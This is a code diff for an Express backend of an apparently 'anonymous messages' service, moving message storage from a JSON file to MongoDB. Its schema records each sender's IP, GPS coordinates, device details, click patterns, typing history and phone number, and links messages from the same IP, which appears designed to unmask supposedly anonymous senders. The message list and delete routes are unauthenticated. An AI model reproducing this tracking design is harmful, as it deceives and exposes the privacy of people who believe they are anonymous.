@@ -1,10 +1,10 @@
 const express = require('express');
 const cors = require('cors');
-const fs = require('fs').promises;
 const path = require('path');
 const axios = require('axios');
 const UAParser = require('ua-parser-js');
 const { Resend } = require('resend');
+const mongoose = require('mongoose');
 
 // Detect source app from referrer/user-agent
 function detectSource(referrer = '', uaRaw = '') {
@@ -36,6 +36,43 @@ function detectSource(referrer = '', uaRaw = '') {
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// MongoDB Connection
+const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/anonymous-messages';
+mongoose.connect(MONGODB_URI)
+  .then(() => console.log('✅ MongoDB connected'))
+  .catch(err => console.error('❌ MongoDB connection failed:', err.message));
+
+// MongoDB Schema
+const messageSchema = new mongoose.Schema({
+  id: { type: Number, required: true, unique: true },
+  message: { type: String, required: true },
+  timestamp: { type: String, required: true },
+  timeOnPage: Number,
+  clickPatterns: [{ element: String, timestamp: Number }],
+  textHistory: [{ text: String, timestamp: Number }],
+  ip: String,
+  location: String,
+  coordinates: {
+    latitude: Number,
+    longitude: Number,
+    accuracy: Number
+  },
+  userAgent: {
+    browser: String,
+    browserVersion: String,
+    os: String,
+    osVersion: String,
+    deviceType: String
+  },
+  referrer: String,
+  source: String,
+  language: String,
+  shareTag: String,
+  phone: String
+}, { timestamps: true });
+
+const Message = mongoose.model('Message', messageSchema);
+
 app.set('trust proxy', true);
 app.use(cors());
 app.use(express.json());
@@ -46,8 +83,6 @@ app.use(express.static(path.join(__dirname, '../frontend')));
 const resend = process.env.RESEND_API_KEY
   ? new Resend(process.env.RESEND_API_KEY)
   : null;
-
-const MESSAGES_FILE = path.join(__dirname, 'messages.json');
 
 async function sendEmail(subject, text, html) {
   if (!resend) {
@@ -72,9 +107,10 @@ async function sendEmail(subject, text, html) {
 // Get all messages
 app.get('/messages', async (req, res) => {
   try {
-    const data = await fs.readFile(MESSAGES_FILE, 'utf8');
-    res.json(JSON.parse(data));
-  } catch {
+    const messages = await Message.find().sort({ id: -1 }).lean();
+    res.json(messages);
+  } catch (err) {
+    console.error('Error fetching messages:', err);
     res.json([]);
   }
 });
@@ -150,7 +186,7 @@ app.post('/message', async (req, res) => {
     const language = (req.headers['accept-language'] || 'Unknown').split(',')[0].trim();
     const source = detectSource(referrer, uaRaw);
 
-    const newMessage = {
+    const newMessageData = {
       id: Date.now(),
       message: message.trim(),
       timestamp: new Date().toISOString(),
@@ -172,13 +208,16 @@ app.post('/message', async (req, res) => {
       language,
       shareTag: req.body.shareTag || null
     };
-    if (phoneAuto) newMessage.phone = phoneAuto;
+    if (phoneAuto) newMessageData.phone = phoneAuto;
 
-    messages.push(newMessage);
-    await fs.writeFile(MESSAGES_FILE, JSON.stringify(messages, null, 2));
+    // Save to MongoDB
+    const newMessage = await Message.create(newMessageData);
 
     // Find all previous messages from this IP
-    const previousMessages = messages.filter(m => m.ip === ip && m.id !== newMessage.id);
+    const previousMessages = await Message.find({ 
+      ip, 
+      id: { $ne: newMessage.id } 
+    }).sort({ id: -1 }).lean();
 
     // EMAIL (async, safe)
     const coord = newMessage.coordinates || {};
@@ -255,11 +294,13 @@ User Previous Messages: ${previousMessages.length > 0 ? previousMessages.map(m =
 
 // Delete message
 app.delete('/message/:id', async (req, res) => {
-  const id = Number(req.params.id);
-  const data = await fs.readFile(MESSAGES_FILE, 'utf8').catch(() => '[]');
-  const messages = JSON.parse(data).filter(m => m.id !== id);
-  await fs.writeFile(MESSAGES_FILE, JSON.stringify(messages, null, 2));
-  res.json({ success: true });
+  try {
+    const id = Number(req.params.id);
+    await Message.deleteOne({ id });
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to delete message' });
+  }
 });
 
 app.listen(PORT, () => {
